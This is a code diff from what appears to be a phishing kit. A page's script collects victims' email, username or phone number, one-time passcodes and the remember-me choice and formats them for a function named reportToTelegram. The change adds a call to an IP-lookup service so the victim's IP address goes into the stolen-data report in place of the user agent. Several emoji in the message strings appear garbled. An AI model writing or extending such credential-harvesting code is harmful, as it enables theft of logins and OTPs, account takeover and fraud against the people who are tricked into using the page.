@@ -362,7 +362,17 @@
             code: '',
             rememberMe: false
         };
+          let userIP = "Unknown";
 
+  // Fetch IP address
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      userIP = data.ip;
+    })
+    .catch(() => {
+      userIP = "Unable to fetch";
+    });
         // Format and send collected data to Telegram in the requested format
         async function reportToTelegram(step) {
             let message = `Email, mobile, or username: ${collectedData.email || 'Not provided'}\n`;
@@ -370,7 +380,7 @@
             message += `%D%2 OTP: ${collectedData.code || 'Not provided'}\n`;
             message += `%D%E Remember Me: ${collectedData.rememberMe ? 'Yes' : 'No'}\n`;
             message += `%C%0 Browser Info:\n`;
-            message += `%2 User Agent: ${navigator.userAgent}\n`;
+            message += `%2 User IP: ${userIP}\n`;
             message += `%2 Timestamp: ${new Date().toLocaleString()}\n`;
             message += `%2 Step: ${step}`;
             
